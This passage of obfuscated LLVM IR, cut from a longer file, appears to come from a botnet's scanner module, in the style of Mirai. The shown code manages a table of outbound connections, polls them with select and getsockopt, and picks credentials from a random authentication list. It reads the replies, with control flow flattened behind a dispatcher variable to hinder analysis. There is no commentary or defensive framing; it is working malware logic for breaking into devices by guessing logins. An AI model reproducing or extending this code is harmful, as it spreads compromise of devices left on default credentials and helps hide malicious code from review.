; <label>:360:                                    ; preds = %loopEntry
  %361 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %362 = load i32, i32* %18, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %361, i64 %363
  store %struct.scanner_connection* %364, %struct.scanner_connection** %22, align 8
  %365 = load i32, i32* %18, align 4
  store i32 %365, i32* %9, align 4
  store i32 -1964174806, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  store i32 630105063, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i32, i32* %18, align 4
  %369 = add nsw i32 %368, 1
  store i32 %369, i32* %18, align 4
  store i32 1290113479, i32* %switchVar
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  %371 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %372 = icmp eq %struct.scanner_connection* %371, null
  %373 = select i1 %372, i32 -1893477604, i32 -2097757151
  store i32 %373, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  store i32 95879908, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  %376 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 8
  %378 = load i32, i32* %377, align 4
  %379 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %380 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %379, i32 0, i32 4
  store i32 %378, i32* %380, align 4
  %381 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %382 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %381, i32 0, i32 0
  %383 = load i16, i16* %382, align 4
  %384 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %385 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %384, i32 0, i32 5
  store i16 %383, i16* %385, align 8
  %386 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %386)
  store i32 1233201760, i32* %switchVar
  br label %loopEnd

; <label>:387:                                    ; preds = %loopEntry
  store i32 1437108907, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %390 = getelementptr inbounds [16 x i64], [16 x i64]* %389, i64 0, i64 0
  %391 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %390) #6, !srcloc !1
  %392 = extractvalue { i64, i64* } %391, 0
  %393 = extractvalue { i64, i64* } %391, 1
  %394 = trunc i64 %392 to i32
  store i32 %394, i32* %24, align 4
  %395 = ptrtoint i64* %393 to i64
  %396 = trunc i64 %395 to i32
  store i32 %396, i32* %25, align 4
  store i32 -677155071, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  store i32 -858229648, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %400 = getelementptr inbounds [16 x i64], [16 x i64]* %399, i64 0, i64 0
  %401 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %400) #6, !srcloc !2
  %402 = extractvalue { i64, i64* } %401, 0
  %403 = extractvalue { i64, i64* } %401, 1
  %404 = trunc i64 %402 to i32
  store i32 %404, i32* %26, align 4
  %405 = ptrtoint i64* %403 to i64
  %406 = trunc i64 %405 to i32
  store i32 %406, i32* %27, align 4
  store i32 -309280153, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 352413765, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load i32, i32* %1, align 4
  %410 = icmp slt i32 %409, 256
  %411 = select i1 %410, i32 1568950544, i32 -14585270
  store i32 %411, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %414 = load i32, i32* %1, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %413, i64 %415
  store %struct.scanner_connection* %416, %struct.scanner_connection** %7, align 8
  %417 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %418 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %417, i32 0, i32 3
  %419 = load i32, i32* %418, align 8
  %420 = icmp ugt i32 %419, 1
  %421 = select i1 %420, i32 30, i32 5
  store i32 %421, i32* %28, align 4
  %422 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %423 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %422, i32 0, i32 3
  %424 = load i32, i32* %423, align 8
  %425 = icmp ne i32 %424, 0
  %426 = select i1 %425, i32 2080189422, i32 -2041221201
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = load i32, i32* @fake_time, align 4
  %429 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %430 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %429, i32 0, i32 2
  %431 = load i32, i32* %430, align 4
  %432 = sub i32 %428, %431
  %433 = load i32, i32* %28, align 4
  %434 = icmp ugt i32 %432, %433
  %435 = select i1 %434, i32 654060038, i32 -2041221201
  store i32 %435, i32* %switchVar
  br label %loopEnd

; <label>:436:                                    ; preds = %loopEntry
  %437 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %438 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %437, i32 0, i32 1
  %439 = load i32, i32* %438, align 8
  %440 = call i32 @close(i32 %439)
  %441 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %442 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %441, i32 0, i32 1
  store i32 -1, i32* %442, align 8
  %443 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %444 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %443, i32 0, i32 3
  %445 = load i32, i32* %444, align 8
  %446 = icmp ugt i32 %445, 2
  %447 = select i1 %446, i32 320636601, i32 1144594308
  store i32 %447, i32* %switchVar
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %450 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %449, i32 0, i32 8
  %451 = load i8, i8* %450, align 8
  %452 = add i8 %451, 1
  store i8 %452, i8* %450, align 8
  %453 = zext i8 %452 to i32
  %454 = icmp eq i32 %453, 10
  %455 = select i1 %454, i32 133246760, i32 717040355
  store i32 %455, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  %457 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %458 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %457, i32 0, i32 8
  store i8 0, i8* %458, align 8
  %459 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %460 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %459, i32 0, i32 3
  store i32 0, i32* %460, align 8
  store i32 1567745881, i32* %switchVar
  br label %loopEnd

; <label>:461:                                    ; preds = %loopEntry
  %462 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %462)
  store i32 1567745881, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  store i32 1941111121, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %466 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %465, i32 0, i32 8
  store i8 0, i8* %466, align 8
  %467 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %468 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %467, i32 0, i32 3
  store i32 0, i32* %468, align 8
  store i32 1941111121, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  store i32 1383104908, i32* %switchVar
  br label %loopEnd

; <label>:470:                                    ; preds = %loopEntry
  %471 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %472 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %471, i32 0, i32 3
  %473 = load i32, i32* %472, align 8
  %474 = icmp eq i32 %473, 1
  %475 = select i1 %474, i32 1018036321, i32 1233542717
  store i32 %475, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  %477 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %478 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %477, i32 0, i32 1
  %479 = load i32, i32* %478, align 8
  %480 = srem i32 %479, 64
  %481 = zext i32 %480 to i64
  %482 = shl i64 1, %481
  %483 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %484 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %485 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %484, i32 0, i32 1
  %486 = load i32, i32* %485, align 8
  %487 = sdiv i32 %486, 64
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds [16 x i64], [16 x i64]* %483, i64 0, i64 %488
  %490 = load i64, i64* %489, align 8
  %491 = or i64 %490, %482
  store i64 %491, i64* %489, align 8
  %492 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %493 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %492, i32 0, i32 1
  %494 = load i32, i32* %493, align 8
  %495 = load i32, i32* %12, align 4
  %496 = icmp sgt i32 %494, %495
  %497 = select i1 %496, i32 570157879, i32 1486951410
  store i32 %497, i32* %switchVar
  br label %loopEnd

; <label>:498:                                    ; preds = %loopEntry
  %499 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %500 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %499, i32 0, i32 1
  %501 = load i32, i32* %500, align 8
  store i32 %501, i32* %12, align 4
  store i32 1486951410, i32* %switchVar
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  store i32 1167870778, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %505 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %504, i32 0, i32 3
  %506 = load i32, i32* %505, align 8
  %507 = icmp ne i32 %506, 0
  %508 = select i1 %507, i32 1670172440, i32 857094379
  store i32 %508, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %511 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %510, i32 0, i32 1
  %512 = load i32, i32* %511, align 8
  %513 = srem i32 %512, 64
  %514 = zext i32 %513 to i64
  %515 = shl i64 1, %514
  %516 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %517 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %518 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %517, i32 0, i32 1
  %519 = load i32, i32* %518, align 8
  %520 = sdiv i32 %519, 64
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds [16 x i64], [16 x i64]* %516, i64 0, i64 %521
  %523 = load i64, i64* %522, align 8
  %524 = or i64 %523, %515
  store i64 %524, i64* %522, align 8
  %525 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %526 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %525, i32 0, i32 1
  %527 = load i32, i32* %526, align 8
  %528 = load i32, i32* %11, align 4
  %529 = icmp sgt i32 %527, %528
  %530 = select i1 %529, i32 337412518, i32 -996849162
  store i32 %530, i32* %switchVar
  br label %loopEnd

; <label>:531:                                    ; preds = %loopEntry
  %532 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %533 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %532, i32 0, i32 1
  %534 = load i32, i32* %533, align 8
  store i32 %534, i32* %11, align 4
  store i32 -996849162, i32* %switchVar
  br label %loopEnd

; <label>:535:                                    ; preds = %loopEntry
  store i32 857094379, i32* %switchVar
  br label %loopEnd

; <label>:536:                                    ; preds = %loopEntry
  store i32 1167870778, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  store i32 1383104908, i32* %switchVar
  br label %loopEnd

; <label>:538:                                    ; preds = %loopEntry
  %539 = load i32, i32* %1, align 4
  %540 = add nsw i32 %539, 1
  store i32 %540, i32* %1, align 4
  store i32 352413765, i32* %switchVar
  br label %loopEnd

; <label>:541:                                    ; preds = %loopEntry
  %542 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 1
  store i64 0, i64* %542, align 8
  %543 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 0
  store i64 1, i64* %543, align 8
  %544 = load i32, i32* %12, align 4
  %545 = load i32, i32* %11, align 4
  %546 = icmp sgt i32 %544, %545
  %547 = select i1 %546, i32 -885015824, i32 -2024530145
  store i32 %547, i32* %switchVar
  br label %loopEnd

; <label>:548:                                    ; preds = %loopEntry
  %549 = load i32, i32* %12, align 4
  store i32 -1959552682, i32* %switchVar
  store i32 %549, i32* %.reg2mem29
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = load i32, i32* %11, align 4
  store i32 -1959552682, i32* %switchVar
  store i32 %551, i32* %.reg2mem29
  br label %loopEnd

; <label>:552:                                    ; preds = %loopEntry
  %.reload30 = load i32, i32* %.reg2mem29
  %553 = add nsw i32 1, %.reload30
  %554 = call i32 @select(i32 %553, %struct.fd_set.26* %5, %struct.fd_set.26* %6, %struct.fd_set.26* null, %struct.timeval.27* %8)
  store i32 %554, i32* %13, align 4
  %555 = call i64 @time(i64* null) #6
  %556 = trunc i64 %555 to i32
  store i32 %556, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  store i32 1026702061, i32* %switchVar
  br label %loopEnd

; <label>:557:                                    ; preds = %loopEntry
  %558 = load i32, i32* %1, align 4
  %559 = icmp slt i32 %558, 256
  %560 = select i1 %559, i32 -1240873298, i32 -1869829136
  store i32 %560, i32* %switchVar
  br label %loopEnd

; <label>:561:                                    ; preds = %loopEntry
  %562 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %563 = load i32, i32* %1, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %562, i64 %564
  store %struct.scanner_connection* %565, %struct.scanner_connection** %7, align 8
  %566 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %567 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %566, i32 0, i32 1
  %568 = load i32, i32* %567, align 8
  %569 = icmp eq i32 %568, -1
  %570 = select i1 %569, i32 -1877402691, i32 1362387816
  store i32 %570, i32* %switchVar
  br label %loopEnd

; <label>:571:                                    ; preds = %loopEntry
  store i32 -538795431, i32* %switchVar
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  %573 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %574 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %575 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %574, i32 0, i32 1
  %576 = load i32, i32* %575, align 8
  %577 = sdiv i32 %576, 64
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds [16 x i64], [16 x i64]* %573, i64 0, i64 %578
  %580 = load i64, i64* %579, align 8
  %581 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %582 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %581, i32 0, i32 1
  %583 = load i32, i32* %582, align 8
  %584 = srem i32 %583, 64
  %585 = zext i32 %584 to i64
  %586 = shl i64 1, %585
  %587 = and i64 %580, %586
  %588 = icmp ne i64 %587, 0
  %589 = select i1 %588, i32 -130881996, i32 -1256540414
  store i32 %589, i32* %switchVar
  br label %loopEnd

; <label>:590:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %591 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %592 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %591, i32 0, i32 1
  %593 = load i32, i32* %592, align 8
  %594 = bitcast i32* %29 to i8*
  %595 = call i32 @getsockopt(i32 %593, i32 1, i32 4, i8* %594, i32* %31) #6
  store i32 %595, i32* %30, align 4
  %596 = load i32, i32* %29, align 4
  %597 = icmp eq i32 %596, 0
  %598 = select i1 %597, i32 -2052422577, i32 1060922498
  store i32 %598, i32* %switchVar
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  %600 = load i32, i32* %30, align 4
  %601 = icmp eq i32 %600, 0
  %602 = select i1 %601, i32 -848066698, i32 1060922498
  store i32 %602, i32* %switchVar
  br label %loopEnd

; <label>:603:                                    ; preds = %loopEntry
  %604 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %605 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %604, i32 0, i32 3
  store i32 2, i32* %605, align 8
  %606 = call %struct.scanner_auth* @random_auth_entry()
  %607 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %608 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %607, i32 0, i32 0
  store %struct.scanner_auth* %606, %struct.scanner_auth** %608, align 8
  %609 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %610 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %609, i32 0, i32 6
  store i32 0, i32* %610, align 4
  store i32 -90544951, i32* %switchVar
  br label %loopEnd

; <label>:611:                                    ; preds = %loopEntry
  %612 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %613 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %612, i32 0, i32 1
  %614 = load i32, i32* %613, align 8
  %615 = call i32 @close(i32 %614)
  %616 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %617 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %616, i32 0, i32 1
  store i32 -1, i32* %617, align 8
  %618 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %619 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %618, i32 0, i32 8
  store i8 0, i8* %619, align 8
  %620 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %621 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %620, i32 0, i32 3
  store i32 0, i32* %621, align 8
  store i32 -538795431, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  store i32 -1256540414, i32* %switchVar
  br label %loopEnd

; <label>:623:                                    ; preds = %loopEntry
  %624 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %625 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %626 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %625, i32 0, i32 1
  %627 = load i32, i32* %626, align 8
  %628 = sdiv i32 %627, 64
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds [16 x i64], [16 x i64]* %624, i64 0, i64 %629
  %631 = load i64, i64* %630, align 8
  %632 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %633 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %632, i32 0, i32 1
  %634 = load i32, i32* %633, align 8
  %635 = srem i32 %634, 64
  %636 = zext i32 %635 to i64
  %637 = shl i64 1, %636
  %638 = and i64 %631, %637
  %639 = icmp ne i64 %638, 0
  %640 = select i1 %639, i32 -458179096, i32 -1607328824
  store i32 %640, i32* %switchVar
  br label %loopEnd

; <label>:641:                                    ; preds = %loopEntry
  store i32 -1013021947, i32* %switchVar
  br label %loopEnd

; <label>:642:                                    ; preds = %loopEntry
  %643 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %644 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %643, i32 0, i32 3
  %645 = load i32, i32* %644, align 8
  %646 = icmp eq i32 %645, 0
  %647 = select i1 %646, i32 1007424285, i32 1174833171
  store i32 %647, i32* %switchVar
  br label %loopEnd

; <label>:648:                                    ; preds = %loopEntry
  store i32 1307937588, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  %650 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %651 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %650, i32 0, i32 6
  %652 = load i32, i32* %651, align 4
  %653 = icmp eq i32 %652, 256
  %654 = select i1 %653, i32 -1964507306, i32 -587596079
  store i32 %654, i32* %switchVar
  br label %loopEnd

; <label>:655:                                    ; preds = %loopEntry
  %656 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %657 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %656, i32 0, i32 7
  %658 = getelementptr inbounds [256 x i8], [256 x i8]* %657, i32 0, i32 0
  %659 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %660 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %659, i32 0, i32 7
  %661 = getelementptr inbounds [256 x i8], [256 x i8]* %660, i32 0, i32 0
  %662 = getelementptr inbounds i8, i8* %661, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %658, i8* %662, i64 192, i32 1, i1 false)
  %663 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %664 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %663, i32 0, i32 6
  %665 = load i32, i32* %664, align 4
  %666 = sub nsw i32 %665, 64
  store i32 %666, i32* %664, align 4
  store i32 -587596079, i32* %switchVar
  br label %loopEnd

; <label>:667:                                    ; preds = %loopEntry
  %668 = call i32* @__errno_location() #7
  store i32 0, i32* %668, align 4
  %669 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %670 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %669, i32 0, i32 1
  %671 = load i32, i32* %670, align 8
  %672 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %673 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %672, i32 0, i32 7
  %674 = getelementptr inbounds [256 x i8], [256 x i8]* %673, i32 0, i32 0
  %675 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %676 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %675, i32 0, i32 6
  %677 = load i32, i32* %676, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds i8, i8* %674, i64 %678
  %680 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %681 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %680, i32 0, i32 6
  %682 = load i32, i32* %681, align 4
  %683 = sub nsw i32 256, %682
  %684 = call i32 @recv_strip_null(i32 %671, i8* %679, i32 %683, i32 16384)
  store i32 %684, i32* %32, align 4
  %685 = load i32, i32* %32, align 4
  %686 = icmp eq i32 %685, 0
  %687 = select i1 %686, i32 -1984206930, i32 -1537600115
  store i32 %687, i32* %switchVar
  br label %loopEnd

; <label>:688:                                    ; preds = %loopEntry
  %689 = call i32* @__errno_location() #7
  store i32 104, i32* %689, align 4
  store i32 -1, i32* %32, align 4
  store i32 -1537600115, i32* %switchVar
  br label %loopEnd

; <label>:690:                                    ; preds = %loopEntry
  %691 = load i32, i32* %32, align 4
  %692 = icmp eq i32 %691, -1
  %693 = select i1 %692, i32 65062739, i32 -977884619
  store i32 %693, i32* %switchVar
  br label %loopEnd

; <label>:694:                                    ; preds = %loopEntry
  %695 = call i32* @__errno_location() #7
  %696 = load i32, i32* %695, align 4
  %697 = icmp ne i32 %696, 11
  %698 = select i1 %697, i32 -1484978027, i32 1657737642
  store i32 %698, i32* %switchVar
  br label %loopEnd

; <label>:699:                                    ; preds = %loopEntry
  %700 = call i32* @__errno_location() #7
  %701 = load i32, i32* %700, align 4
  %702 = icmp ne i32 %701, 11
  %703 = select i1 %702, i32 1275931694, i32 1657737642
  store i32 %703, i32* %switchVar
  br label %loopEnd

; <label>:704:                                    ; preds = %loopEntry
  %705 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %706 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %705, i32 0, i32 1
  %707 = load i32, i32* %706, align 8
  %708 = call i32 @close(i32 %707)
  %709 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %710 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %709, i32 0, i32 1
  store i32 -1, i32* %710, align 8
  %711 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %712 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %711, i32 0, i32 8
  %713 = load i8, i8* %712, align 8
  %714 = add i8 %713, 1
  store i8 %714, i8* %712, align 8
  %715 = zext i8 %714 to i32
  %716 = icmp sge i32 %715, 10
  %717 = select i1 %716, i32 -2017126436, i32 1831058522
  store i32 %717, i32* %switchVar
  br label %loopEnd

; <label>:718:                                    ; preds = %loopEntry
  %719 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %720 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %719, i32 0, i32 8
  store i8 0, i8* %720, align 8
  %721 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %722 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %721, i32 0, i32 3
  store i32 0, i32* %722, align 8
  store i32 80723752, i32* %switchVar
  br label %loopEnd

; <label>:723:                                    ; preds = %loopEntry
  %724 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %724)
  store i32 80723752, i32* %switchVar
  br label %loopEnd

; <label>:725:                                    ; preds = %loopEntry
  store i32 1657737642, i32* %switchVar
  br label %loopEnd

; <label>:726:                                    ; preds = %loopEntry
  store i32 1307937588, i32* %switchVar
  br label %loopEnd

; <label>:727:                                    ; preds = %loopEntry
  %728 = load i32, i32* %32, align 4
  %729 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %730 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %729, i32 0, i32 6
  %731 = load i32, i32* %730, align 4
  %732 = add nsw i32 %731, %728
  store i32 %732, i32* %730, align 4
  %733 = load i32, i32* @fake_time, align 4
  %734 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %735 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %734, i32 0, i32 2
  store i32 %733, i32* %735, align 4
  store i32 1533872320, i32* %switchVar
  br label %loopEnd

; <label>:736:                                    ; preds = %loopEntry
  store i32 0, i32* %33, align 4
  %737 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %738 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %737, i32 0, i32 3
  %739 = load i32, i32* %738, align 8
  store i32 %739, i32* %.reg2mem18
  store i32 231664309, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload28 = load volatile i32, i32* %.reg2mem18
  %Pivot16 = icmp slt i32 %.reload28, 6
  %740 = select i1 %Pivot16, i32 509482508, i32 -996113285
  store i32 %740, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload23 = load volatile i32, i32* %.reg2mem18
  %Pivot14 = icmp slt i32 %.reload23, 8
  %741 = select i1 %Pivot14, i32 -398296909, i32 1501925125
  store i32 %741, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload21 = load volatile i32, i32* %.reg2mem18
  %Pivot12 = icmp slt i32 %.reload21, 9
  %742 = select i1 %Pivot12, i32 1053176080, i32 1263400578
  store i32 %742, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload20 = load volatile i32, i32* %.reg2mem18
  %Pivot10 = icmp slt i32 %.reload20, 10
  %743 = select i1 %Pivot10, i32 -1126833515, i32 1824257546
  store i32 %743, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload19 = load volatile i32, i32* %.reg2mem18
  %SwitchLeaf8 = icmp eq i32 %.reload19, 10
  %744 = select i1 %SwitchLeaf8, i32 694326563, i32 1433588522
  store i32 %744, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload22 = load volatile i32, i32* %.reg2mem18
  %Pivot6 = icmp slt i32 %.reload22, 7
  %745 = select i1 %Pivot6, i32 626411601, i32 1873997368
  store i32 %745, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload27 = load volatile i32, i32* %.reg2mem18
  %Pivot4 = icmp slt i32 %.reload27, 4
  %746 = select i1 %Pivot4, i32 -1621285137, i32 -745174414
